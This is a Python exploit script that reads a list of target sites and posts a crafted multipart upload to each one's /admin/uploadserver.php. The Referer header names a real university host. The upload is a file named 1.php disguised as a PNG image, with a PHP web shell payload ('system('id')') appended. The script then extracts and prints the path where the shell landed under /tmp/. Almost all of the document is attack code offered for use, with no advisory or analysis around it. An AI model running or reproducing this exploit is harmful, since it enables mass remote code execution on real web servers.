#usage: python3 exploit.py ./url.txt


import requests
import re
import socket
import sys
import os.path
import urllib3

headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36',
        #'Accept:': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryGkAujqdchaYhZ2eF',
        'Referer': 'http://coursemap.nkut.edu.tw/admin/main.php',
    }

data='''

------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="TB_pt_name"

1
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="TB_pt_html_yn"

0
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="TB_pt_detail"

1
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="TB_pt_detail_tmp"

1
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="TB_pt_desc_html_yn"

0
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="TB_pt_desc"

1
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="TB_pt_desc_tmp"

1
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="TB_pt_part"


------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="TB_pt_rel_date"

2021-10-08
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="TB_pt_expire"

2099-12-31
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="TB_pt_acti"

1
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="TB_pt_homeshow"

1
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="CopySmallPic"

950/part_224_4917661_78051.txt
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="TB_pt_s_fix"

0
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="C10_RightList_setSmallSize"

0
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="small_Pic"; filename="1.php"
Content-Type: image/png

?PNG

   
IHDR   @   k   H`|  IDATxÃ­??
? ?@B?=_???d?^??33gÃ³??/???Ã¼]Â°@}!?xX!T 2^V?@??W??@P ?`?8P?xX!T 2^V?@??W??@P ?`?8P?xX!T 2^V?@??W??@P ?`?8P?xX!T 2^V?@??W??@P ?`?8P?xX!T 2^V?@??W??@P ?`?8P?xX!T 2^V?@??W??@P ?`?8P?xX!?!F?nÃ¬??    IEND?B`<?php system('id'); ?>
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="_UploadField[]"

small_Pic
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="_UploadType[small_Pic]"

image&&flash
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="TB_pt_s_img_desc"


------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="ImgName_89"

950/part_224_9600175_77693.txt
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="89_pti_fix"

1
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="C10_RightList_pti_fix_width_89"

200
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="C10_RightList_pti_fix_height_89"

200
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="C10_RightList_setLargeSize_89"

1
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="C10_RightList_originLargeWidth_89"

200
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="C10_RightList_originLargeHeight_89"

200
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="89_pti_desc"


------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="89_pti_acti"

1
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="89_pti_desc_yn"

0
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="CopyImgInfo"

224
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="LargeImgNum"

1
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="bigPic_2"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="2_newPti_desc"


------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="_UploadField[]"

bigPic_2
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="_UploadType[bigPic_2]"

image&&flash
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="TB_pt_imglayout"

0
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="TB_pt_modlayout"

2001
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="Par"


------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="RcgPar"


------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="UploadName"


------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="CopyImgName"


------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="_JsName"

C10_RightList_dealPtUpload
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="ImgName"


------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="Callback"


------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="CallbackValue"


------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="PageLang"

zh-tw
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="sel_pt_tomeet_mod"

2
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="TB_pt_tomeet_id"

0
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="TB_pt_tomeet_type"


------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="TB_pt_tomeet_mod"

0
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="current_pt_tomeet_id"

0
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="current_pt_tomeet_type"


------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="current_pt_tomeet_mod"

0
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="isselradio"

0
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="newpttmid"


------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="cal_local_yn"

0
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="cal_child_yn"

0
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="CalCg"

0
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="TB_pt_userid"

admin
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="TB_pt_added"

2021-10-08 15:15:39
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="TB_pt_mod_group"

admin
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="TB_pt_mod_user"

admin
------WebKitFormBoundaryGkAujqdchaYhZ2eF
Content-Disposition: form-data; name="TB_pt_mod_date"

2021-10-08 15:27:31
------WebKitFormBoundaryGkAujqdchaYhZ2eF--
'''
ex='TmpName</K><V>(.*?)</V></Item>'
def exploit():
    try:
        urllib3.disable_warnings()
        url1=urls+"/admin/uploadserver.php"
        url= url1.rstrip()
        re1 = requests.post(url=url, headers=headers, data=data, verify=False)
        re_text = re1.text
        if re1.status_code == 200 :
            #print(re_text)
            if 'php' in re1.text:
                flag = re.findall(ex, re_text)
                #print(url1)
                print(urls+'/tmp/'+flag[0])
    except:
        pass



if __name__ == "__main__":
    try:
        file = open(sys.argv[1])
        for url in file.readlines():
            urls=url.strip()
            if urls[-1]=='/':
                urls=urls[:-1]
            exploit()
        print ('Check Over')
    except KeyboardInterrupt:
        print("Search interrupted by user..")
